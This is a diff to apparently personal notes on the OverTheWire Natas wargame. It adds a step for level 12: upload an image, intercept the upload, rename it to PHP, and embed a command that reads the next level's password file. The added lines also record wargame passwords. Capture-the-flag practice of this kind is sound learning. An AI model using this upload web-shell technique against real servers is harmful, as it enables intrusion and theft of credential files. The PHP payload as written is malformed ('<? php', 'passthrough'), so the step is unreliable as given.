@@ -35,10 +35,12 @@ N11 --> See functiion encode and decode cookie and replace cookie.
 --- %3D at the end is a URL-encoded version of =
   N12 --> yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB
 
-N12 --> 
-  N13 --> 
+N12 --> Upload ay jpg file. Intercept upload and change jpg to php and add 
+--- <? php echo passthrough (' cat /etc/natas_webpass/natas13 '); ?>
+  N13 --> trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC
 
-
+N13 --> 
+  N14 -->
 
 
 
